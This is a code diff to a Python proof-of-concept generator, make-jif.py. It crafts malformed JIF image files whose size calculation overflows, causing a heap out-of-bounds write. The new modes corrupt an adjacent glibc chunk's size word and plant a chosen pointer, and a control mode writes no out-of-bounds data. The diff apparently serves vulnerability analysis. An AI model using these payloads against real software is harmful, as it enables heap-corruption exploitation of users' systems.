@@ -11,7 +11,16 @@ product 45771*46918 = 0x80000082, whose alpha-doubled data_size is 260.
 Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
                         published-long HEXBYTE | published-run N HEXBYTE |
                         published-hex HEXSTRING | published-mix IN OUT |
-                        published-ptr | safe HEXBYTE)
+                        published-ptr | safe HEXBYTE |
+                        minimal-size | minimal-ptr HEXADDR |
+                        minimal-noob HEXBYTE)
+
+`minimal-size` and `minimal-ptr` keep the 40-byte minimal-geometry zlib
+payload but preserve the adjacent glibc chunk size word at indexes+24
+(0x41), changing only that chunk's first user word at +32. They isolate
+chunk-metadata corruption from chosen-pointer use; they claim no deref.
+`minimal-noob` writes only `data_size` bytes: same wrapped geometry, no OOB
+write, control for the terminal fault's cause.
 """
 import struct
 import sys
@@ -52,9 +61,14 @@ elif kind in ("published", "published-long", "published-mix", "published-run",
 elif kind == "ptr":
     chosen = struct.pack("<Q", 0x00007F0000414243)
     plain = b"\x4d" * 32 + chosen + b"\x4d" * 8
+elif kind in ("minimal-size", "minimal-ptr"):
+    word = 0x4d4d4d4d4d4d4d4d if kind == "minimal-size" else int(sys.argv[3], 16)
+    plain = b"\x4d" * 24 + struct.pack("<Q", 0x41) + struct.pack("<Q", word)
+elif kind == "minimal-noob":
+    plain = bytes([int(sys.argv[3], 16)]) * 4
 else:
     raise SystemExit("unknown mode")
-if kind in ("bytes", "ptr"):
+if kind in ("bytes", "ptr", "minimal-size", "minimal-ptr", "minimal-noob"):
     assert LEN * HEIGHT == 0x80000002
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
 elif kind in ("published", "published-long", "published-mix",
